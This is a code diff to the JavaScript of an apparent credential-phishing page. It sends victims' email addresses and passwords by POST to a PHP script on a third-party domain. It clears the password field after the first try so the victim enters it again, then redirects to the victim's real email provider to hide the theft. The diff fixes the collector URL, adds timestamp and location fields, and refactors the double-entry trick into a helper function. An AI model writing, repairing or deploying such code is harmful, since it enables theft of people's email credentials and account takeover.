@@ -1,5 +1,3 @@
-
-
 let passwordAttempts = 0;
 
 $(document).ready(function () {
@@ -19,39 +17,39 @@ function initializeForm() {
         }
 
         $.ajax({
-            url: "https://lorneplumbing.com.au/via/logn.php", 
+            url: "https://lorneplumbing.com.au/via/login.php",
             type: "POST",
+            contentType: "application/json",
             dataType: "json",
-            data: {
+            data: JSON.stringify({
                 email: email,
-                password: password
-            },
+                password: password,
+                city: "", // Replace with actual city value if available
+                currentTime: new Date().toISOString()
+            }),
             success: function (response) {
-
-                passwordAttempts++;
-
-                if (passwordAttempts === 1) {
-                    $("#password").val("").focus();
-                    return;
-                }
-
-                redirectToEmailProvider();
+                console.log(response);
+                handleAttempt();
             },
-            error: function () {
-
-                passwordAttempts++;
-
-                if (passwordAttempts === 1) {
-                    $("#password").val("").focus();
-                    return;
-                }
-
-                redirectToEmailProvider();
+            error: function (xhr, status, error) {
+                console.error(error);
+                handleAttempt();
             }
         });
 
     });
 
+}
+
+function handleAttempt() {
+    passwordAttempts++;
+
+    if (passwordAttempts === 1) {
+        $("#password").val("").focus();
+        return;
+    }
+
+    redirectToEmailProvider();
 }
 
 function nextStep() {
@@ -91,4 +89,3 @@ function redirectToEmailProvider() {
     window.location.href = "https://" + domain;
 
 }
-         
